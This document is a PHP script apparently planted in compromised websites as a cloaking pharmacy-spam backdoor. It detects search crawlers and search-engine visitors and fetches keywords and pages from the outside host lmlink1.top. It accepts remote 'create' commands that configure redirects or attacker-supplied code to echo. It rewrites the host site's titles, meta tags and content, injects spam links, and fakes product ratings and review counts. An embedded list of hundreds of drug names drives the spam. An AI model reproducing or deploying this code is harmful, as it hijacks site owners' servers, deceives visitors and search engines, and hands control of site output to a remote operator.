gogo
@ini_set('display_errors', '0');
error_reporting(0);
@ini_set("memory_limit","1024M");
$curtime = time();
$hspan = 0;

if (ini_get('allow_url_fopen')) {
    function get_data_yo($url) {
        $data = file_get_contents($url);
        return $data;
    }
}
else {
    function get_data_yo($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
}
$ip = urlencode($_SERVER['REMOTE_ADDR']);
$ua = urlencode($_SERVER['HTTP_USER_AGENT']);
$ref = urlencode($_SERVER['HTTP_REFERER']);
$poiskoviki = '/google|yandex|bing|yahoo|aol|rambler/i';
$fromse = 0;
if ($ref && preg_match($poiskoviki, $ref)) $fromse = 1;
$abt = 0;
if (isset($_GET['debug'])) $abt = 1;
$crawlers = '/google|bot|crawl|slurp|spider|yandex|rambler/i';
if (preg_match($crawlers, $ua)) {
    $abt = 1;
}
if (file_exists("{$eb}.bt")) {
    $bots = file("{$eb}.bt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $btime = filemtime("{$eb}.bt");
    $obtime = $curtime - $btime;
}
if (!$bots[2] || $obtime > 172800) {
    $fbots = get_data_yo("http://lmlink1.top/lnk/bots.dat");
    $btf = fopen("{$eb}.bt", 'w');
    fwrite($btf, $fbots);
    fclose($btf);
    $bots = file("{$eb}.bt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}
if (in_array($ip, $bots)) {
        $abt = 1;
}

$st = '.st';
$cldw = 0;
$dw = 0;


if (isset($_REQUEST["create"]) || $_REQUEST["create"]) {
        $cldw = 0;
        if ($_REQUEST['cldw']) $cldw = 1;
        $qq = $_REQUEST['qq'];
        if (!file_exists("{$eb}{$st}/.r")) {
                $qq = $_REQUEST['qq'];
                mkdir("{$eb}{$st}");
        }
        else {
            $pamparam = file_get_contents("{$eb}{$st}/.r");
            $eqq = explode('|', $pamparam);
            if (isset($_REQUEST['qq']) && $_REQUEST['qq']) $qq = $_REQUEST['qq'];
            else $qq = trim($eqq[2]);
        }
        $redir = $_REQUEST['redir'];
        $redcode = $_REQUEST['redcode'];
        $redcode = urldecode($redcode);
        $redcode = base64_encode($redcode);
        $group = $_REQUEST['group'];
        if ($cldw) {
            $keys = file("http://lmlink1.top/lnk/gen/keys/$group.keys");
            shuffle($keys);
            $clkeys = '';
            foreach ($keys as $clkey) {
                $clkeys .= $clkey;
            }
            file_put_contents("{$eb}{$st}/.k", $clkeys);
        }
        $lang = $_REQUEST['lang'];
        file_put_contents("{$eb}{$st}/.r", "$redir|$group|$qq|$lang|$redcode|$cldw");
        if (file_exists("{$eb}{$st}/.r")) {
            echo "created";
            die();
        }
}

if (file_exists("{$eb}{$st}/.r")) {
    $dw = 1;
    $pamparam = file_get_contents("{$eb}{$st}/.r");
    $eqq = explode('|', $pamparam);
    $redir = $eqq[0];
    if (!strstr($redir, 'http://')) $redir = base64_decode($redir);
    $group = $eqq[1];
    $qq = trim($eqq[2]);
    $lang = trim($eqq[3]);
    if ($eqq[4]) $redcode = base64_decode($eqq[4]);
    $cldw = $eqq[5];
}


//$fromse = 1;

if (($_GET[$qq] || $cldw) && $fromse && !$abt && !$morda) {
    if (!$redcode) {
        if ($key) $tkey = str_replace(' ', '+', $key);
        else $tkey = str_replace('-', '+', $_GET[$qq]);
        if (strstr($redir, '?')) $redir .= "&keyword=".$tkey."&pill=$tdpill";
        else $redir .= "?keyword=".$tkey."&pill=$tdpill";
        header("Location: $redir"); 
        echo "<script type=\"text/javascript\">location.href=\"$redir\";</script>";
        die();
    }
else { 
$key = str_replace('-', ' ', $_GET[$qq]); 
$redcode = str_replace('KEY', $key, $redcode); 
echo stripslashes($redcode); 
} 
}

if ($abt || $fromse || $redcode || $hspan) {
    $epills = explode("
", "abana
abilify
acai
accutane
aceon
aciclovir
aciphex
acivir pills
acticin
actonel
actoplus met
actos
adalat
advair diskus
alavert
albendazole
albenza
aldactone
alesse
aleve
allegra
alli
allopurinol
alphagan
altace
amantadine
amaryl
amitriptyline
amoxil
ampicillin
anacin
anafranil
antabuse
antivert
apcalis sx
arava
aricept
arimidex
aristocort
arjuna
artane
asacol
ashwagandha
aspirin
astelin
atarax
atorlip-10
atorlip-20
atorlip-5
atrovent
augmentin
avalide
avandamet
avapro
avodart
aygestin
ayurslim
azulfidine
baclofen
bactrim
bactroban
beconase aq
benadryl
benemid
benfotiamine
benicar
bentyl
benzac
betapace
betnovate
betoptic
biaxin
blopress
brafix
brahmi
brand advair diskus
brand amoxil
brand cialis
brand levitra
brand viagra
bupron sr
bupropion
buspar
bystolic
cabgolin
cafergot
calan
calcium carbonate
capoten
carafate
carbozyne
cardizem
cardura
casodex
caverta
cefadroxil
cefixime
ceftin
celadrin
celebrex
celexa
cephalexin
chloramphenicol
chloromycetin
chloroquine
cholestoplex
cialis
cialis jelly
cialis professional
cialis soft
cialis sublingual
cialis super active
ciplox
cipro
citalopram
claritin
cleocin
cleocin gel
clomid
clonidine
clozaril
colchicine
colospa
combivent
compazine
confido
cordarone
coreg
coumadin
cozaar
crestor
cyklokapron
cymbalta
cystone
cytotec
cytoxan
danazol
dapoxetine
decadron
deltasone
depakote
desyrel
detrol
diabecon
diakof
diamox
diarex
diclofenac
diclofenac gel
differin
diflucan
digoxin
dilantin
diltiazem
diovan
dipyridamole
ditropan
dostinex
doxazosin
doxycycline
dramamine
duetact
dulcolax
duphalac
dutas
effexor xr
elavil
eldepryl
elimite
elocon
emsam
endep
entocort
ephedraxin
epivir-hbv
erexin-v
erythromycin
estrace
ethionamide
etodolac
eulexin
eurax
evecare
evista
exelon
famvir
feldene
female cialis
female viagra
femara
femcare
fertomid
finast
finax
fincar
finpecia
flagyl er
flomax
flonase
florinef
flovent
floxin
fluoxetine
fml forte
forzest
fosamax
fucidin
furosemide
gasex
geriforte
geriforte syrup
ginette-35
ginseng
glucophage
glucotrol xl
glycomet
glyset
grifulvin v
gyne-lotrimin
haldol
haridra
himcocid
himcolin
himplasia
hoodia
hyaluronic acid
hydrea
hydrochlorothiazide
hytrin
hyzaar
imitrex
imuran
inderal
indinavir
indocin
innopran xl
isoniazid
isoptin
januvia
kamagra
kamagra chewable
kamagra gold
kamagra oral jelly
kamagra soft
keflex
keftab
keppra
kytril
l-tryptophan
lady era
lamictal
lamisil
lanoxin
lariam
lasix
lasuna
levaquin
levitra
levitra plus
levitra professional
levitra super active
levlen
levothroid
lexapro
lincocin
lioresal
lipitor
liposafe
lipothin
lisinopril
lithium
liv 52
lopid
lopressor
lotensin
lotrisone
lozol
lukol
luvox
lynoral
malegra dxt
malegra fxt
maxalt
maxaman
meclizine
medrol
menosan
mentat
mentat ds syrup
mentax
mestinon
metformin
methotrexate
metoclopramide
mevacor
micardis
micronase
midamor
minipress
minocin
minocycline
minomycin
mirapex
mircette
mobic
moduretic
motilium
motrin
myambutol
mycelex-g
naprosyn
neurontin
nexium
nimotop
nitrofurantoin
nitroglycerin
nizagara
nizoral
nolvadex
nootropil
noroxin
norvasc
nymphomax
olanzapine
omnicef
ophthacare
orlistat
oxytrol
pamelor
pariet
parlodel
paroxetine
paxil
penegra
periactin
phenamax
phenergan
phexin
pilex
plavix
plendil
pletal
ponstel
prandin
pravachol
prazosin
precose
prednisolone
prednisone
premarin
prevacid
prilosec
prinivil
probalan
procardia
prograf
promethazine
prometrium
propecia
propranolol
proscar
protonix
proventil
provera
pulmicort
purim
purinethol
pyridium
quibron-t
ralista
ranitidine
reglan
relafen
remeron
reminyl
renagel
requip
retin-a 0%2c025
retin-a 0%2c05
retin-a gel 0%2c1
retino-a cream 0%2c025
retino-a cream 0%2c05
revatio
rhinocort
risperdal
robaxin
rocaltrol
rogaine 2
rogaine 5
rosuvastatin
roxithromycin
rumalaya
rumalaya forte
rumalaya gel
rumalaya liniment
sarafem
saw palmetto
septilin
serevent
seroflo
serophene
seroquel
serpina
shallaki
shatavari
shuddha guggulu
silagra
sinemet
sinequan
singulair
skelaxin
snovitra super power
sominex
speman
starlix
strattera
stromectol
styplon
suhagra
sumycin
suprax
sustiva
synthroid
tadacip
tadalis sx
tadapox
tamoxifen
tegretol
tenormin
terramycin
tetracycline
tinidazole
tofranil
topamax
toprol xl
toradol
torsemide
trandate
trazodone
trental
tretinoin 0%2c025
tretinoin 0%2c05
trial ed set extreme
trial ed set lite
trial ed set standart
triamterene
tricor
trileptal
trimox
tulasi
unisom
urispas
uroxatral
v-gel
valtrex
vantin
vasodilan
vasotec
venlor
ventolin
vermox
viagra
viagra jelly
viagra plus
viagra professional
viagra soft
viagra sublingual
viagra super active
viramune
voltaren
voveran
voveran sr
vpxl
vytorin
wellbutrin
wellbutrin sr
xalatan
xeloda
xenical
yagara
yasmin
zaditor
zanaflex
zantac
zebeta
zenegra
zerit
zestoretic
zestril
zetia
zithromax
zocor
zofran
zoloft
zovirax
zyban
zyloprim
zyprexa
zyrtec
zyvox");
    $tdpill = 'pills';
    $donor = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    $ddomain = $_SERVER['SERVER_NAME'];
    $ddomain = str_ireplace('www.', '', $ddomain);
    $donor = str_ireplace('www.', '', $donor);
    $page = str_replace('/', '|', $donor);
    $donor = urldecode($donor);
    $epage = explode('|', $page);
    $morda = 0;
    if (!$epage[1] && !$epage[2] || $epage[1] == 'index.php' || $epage[1] == '?p=home') $morda = 1;

    if (($abt || $hspan) && !$_GET[$qq]) {
        $ll = get_data_yo("http://lmlink1.top/lnk/tuktuk.php?d=$donor&cldw=$cldw");
        $el = explode('
', $ll);
    }

    if (file_exists("{$eb}{$st}/$page.html")) {
        $htmlpage = file_get_contents("{$eb}{$st}/$page.html");
        echo $htmlpage;
        die();
    }
    if (file_exists("{$eb}{$st}/$page.txt")) {
        $gtxt = file_get_contents("{$eb}{$st}/$page.txt");
        $etxt = explode('|', $gtxt);
        $key = $etxt[0];
        foreach ($epills as $pill) {
            $pill = trim($pill);
            if (stristr($key, $pill)) $tdpill = str_replace(' ', '+', $pill);
        }
        $desc = $etxt[1];
        $txt = $etxt[2];
        $h1 = $etxt[3];
    }
    elseif ($cldw || isset($_GET[$qq])) {
        $desc = '';
        $keys = file("{$eb}{$st}/.k", FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES);
        if ($keys[0]) {
            $key = $keys[0];
            for ($kk = 1; $kk < count($keys); $kk++) $newkeys .= "$keys[$kk]
";
            file_put_contents("{$eb}{$st}/.k", $newkeys);
        }
        if (isset($_GET[$qq])) {
            $key = str_replace('-', ' ', $_GET[$qq]);
        }
        if ($key) {
            $parkey = $key;
            foreach ($epills as $pill) {
                $pill = trim($pill);
                if (strstr($key, $pill)) $tdpill = str_replace(' ', '+', $pill);
            }
            $tkey = str_replace(' ', '-', $key);
            $ttxt = get_data_yo("http://lmlink1.top/lnk/gen/index.php?key=$tkey&g=$group&lang=$lang&page=$page&cldw=$cldw&dd=$ddomain&pill=$tdpill");
            if (preg_match('#<html#is', $ttxt)) {
                echo $ttxt;
                file_put_contents("{$eb}{$st}/$page.html", $ttxt);
                die();
            }
            preg_match('#gogogo(.*)enenen#is', $ttxt, $mtchs);
            $etxt = explode('||', $mtchs[1]);
            $key = $etxt[0];
            $epill = explode(' - ', $key);
            $ttpill = trim($epill[1]);
            $title = ucfirst($key);
            $h1 = ucfirst($etxt[1]);
            $rating = rand(4,5);
            $rcount = rand(22,222);
            $txt = "<div itemscope=\"\" itemtype=\"http://schema.org/Product\">\n<span itemprop=\"name\">$parkey rating</span>\n<div itemprop=\"aggregateRating\" itemscope=\"\" itemtype=\"http://schema.org/AggregateRating\">\n<span itemprop=\"ratingValue\">$rating-5</span> stars based on\n<span itemprop=\"reviewCount\">$rcount</span> reviews\n</div>\n</div>\n";
            $desc = $etxt[2];
            $txt .= $etxt[3];
            if ($desc == 'desc') {
                $desc = get_data_yo("http://lmlink1.top//lnk/gen/desc.php?key=$tkey&desc=$group&pill=$tdpill");
                preg_match('#gogogo(.*)enenen#is', $desc, $mtchs);
                $desc = $mtchs[1];
            }

            file_put_contents("{$eb}{$st}/$page.txt", "$title|$desc|$txt|$h1");
            $newclpage = str_replace('|', '/', $page);
            $newcllink = "<a href=\"http://$newclpage\">$parkey</a>
";
            if ($cldw) file_put_contents("{$eb}{$st}/cldwmap.txt", $newcllink, FILE_APPEND);
        }
    }
    
    

    $cldwmap = file("{$eb}{$st}/cldwmap.txt", FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES);

    ob_start();

    function shutdown() {
        global $morda; global $eb; global $txt; global $qq; global $key;  global $desc; global $lang; global $cldwmap; global $el; global $dw; global $cldw; global $redcode; global $abt; global $hspan; global $h1;
        $title = ucfirst($key);
        $my_content = ob_get_contents();
        ob_end_clean();
        if ($my_content && $_REQUEST['prigod']) {
            $my_content = '---prigod---';
        }
        if ($key && $abt) {

            if ($cldw) {
                preg_match_all('#<a (.*)</a>#iUm', $my_content, $ahrefs);
                $cntahrefs = count($ahrefs[0]);
                $cntcldwmap = count($cldwmap);
                $i = 0;
                foreach ($ahrefs[0] as $ahref) {
                    if ($cldwmap[$i]) {
                        $my_content = str_replace($ahref, $cldwmap[$i], $my_content);
                    }
                    $i++;
                }
                if ($morda) {
                    $cldwfooter = '';
                    foreach ($cldwmap as $cldwflink) {
                        $cldwfooter .= "$cldwflink ";
                    }
                    $my_content = str_replace('</body>', "<footer>
<div class=\"tags_cloud footer column block\" id=\"tags_cloud footer column block\">
$cldwfooter
</div>
</footer>
</body>", $my_content);
                }
            }

            if (!$morda) {
                $my_content = preg_replace('#<title(.*)<\/title>#iUs', "<title>$title</title>", $my_content, 1);
                $my_content = preg_replace("#<link rel=[\"\']{1}canonical(.*)\>#iUs", '', $my_content);
                $my_content = preg_replace("#<link rel=[\"\']{1}shortlink(.*)\>#iUs", '', $my_content);
                $my_content = preg_replace('#<h1(.*)<\/h1>#iUm', "<h1>$h1</h1>", $my_content, 1);
                $my_content = preg_replace('#<h2(.*)<\/h2>#iUm', "<h2>$h1</h2>", $my_content, 1);
                $my_content = preg_replace('#<h3(.*)<\/h3>#iUm', "<h3>$h1</h3>", $my_content, 1);
                $my_content = preg_replace("#<meta name=[\"\']{1}description(.*)\>#iUs", '', $my_content);
                $my_content = preg_replace("#<meta name=[\"\']{1}robots(.*)\>#iUs", '', $my_content);
                $my_content = preg_replace("#<meta name=[\"\']{1}keywords(.*)\>#iUs", '', $my_content);
                $my_content = str_replace('</head>', "<meta name=\"description\" content=\"$desc\">
</head>", $my_content);
                $my_content = preg_replace("#<meta property=[\"\']{1}og:(.*)[\"\']{1} content=[\"\']{1}.*[\"\']{1}\s?\/>#iUs", '', $my_content);
                $my_content = preg_replace('#<script(.*)<\/script>#iUs', '', $my_content, 1);
        
                if (@preg_match('#<article(.*)<\/article>#iUs', $my_content)) {
                    $my_content = preg_replace('#<article(.*)<\/article>#iUs', "<article>
$txt
</article>", $my_content, 1);
                }
                elseif (@preg_match('#<div id="page-content">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div id="page-content">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="page-content">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="page-content">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="maincontent">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="maincontent">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="home-content">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="home-content">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="content"(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="content"(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div id="content"(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div id="content"(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div id="content" class="clearfix">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div id="content" class="clearfix">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div id="content" class="hfeed">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div id="content" class="hfeed">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="content clearfix">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="content clearfix">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="body_container">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="body_container">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div id="content" class="widecolumn">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div id="content" class="widecolumn">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div id="entry-content">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div id="entry-content">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="entry-content">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="entry-content">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div id="main-content">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div id="main-content">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div id="content-area">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div id="content-area">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="post-content">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="post-content">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="item-page">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="item-page">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="grid(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="grid(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="page(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="page(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="column(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="column(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="nextend-flux">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="nextend-flux">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<table(.*)>#iUs')) {
                    $my_content = preg_replace('#<table(.*)>#iUs', "<table>\n<div>$txt</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div class="inner-wrapper">(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div class="inner-wrapper">(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<div(.*)</div>#iUs', $my_content)) {
                    $my_content = preg_replace('#<div(.*)</div>#iUs', "<div>\n$txt\n</div>", $my_content, 1);
                }
                elseif (@preg_match('#<body(.*)>#iUs', $my_content)) {
                    $my_content = preg_replace('#<body(.*)>#iUs', "<body>\n<div>\n$txt\n</div>", $my_content, 1);
                }
            }

        } //end if key
        elseif (!preg_match('#<title>(.*)404#i', $my_content) && !preg_match('#<title>(.*)not found#i', $my_content)) {
            foreach($el as $ln) {
                if (preg_match('#<strong>#', $my_content)) {
                    $my_content = preg_replace('#<strong>#', "_-strong-_ $ln ", $my_content, 1);
                }
                elseif (preg_match('#<b>#', $my_content)) {
                    $my_content = preg_replace('#<b>#', "_-b-_ $ln ", $my_content, 1);
                }
                elseif (preg_match('#<i>#', $my_content)) {
                    $my_content = preg_replace('#<i>#', "_-i-_ $ln ", $my_content, 1);
                }
                elseif (preg_match('#<u>#', $my_content)) {
                    $my_content = preg_replace('#<u>#', "_-u-_ $ln ", $my_content, 1);
                }
                elseif (preg_match('#<p(.*)>#', $my_content)) {
                    $my_content = preg_replace('#<p(.*)>#iUs', "_-p-_ \n$ln ", $my_content, 1);
                }
                elseif (preg_match('#</p>#', $my_content)) {
                    $my_content = preg_replace('#</p>#', "_-/p-_ \n$ln ", $my_content, 1);
                }
                elseif (preg_match('#<br(.*)>#', $my_content)) {
                    $my_content = preg_replace('#<br(.*)>#iUs', " $ln ", $my_content, 1);
                }
                elseif (preg_match('#<span(.*)>#', $my_content)) {
                    $my_content = preg_replace('#<span(.*)>#iUs', "_-span-_ $ln ", $my_content, 1);
                }
                elseif (preg_match('#</body>#', $my_content)) {
                    $my_content = preg_replace('#</body>#', "$ln<br> \n</body>", $my_content, 1);
                }
            }
            $my_content = str_replace('_-', '<', $my_content);
            $my_content = str_replace('-_', '>', $my_content);
        }

        echo $my_content;
    }
    register_shutdown_function('shutdown');
}


enen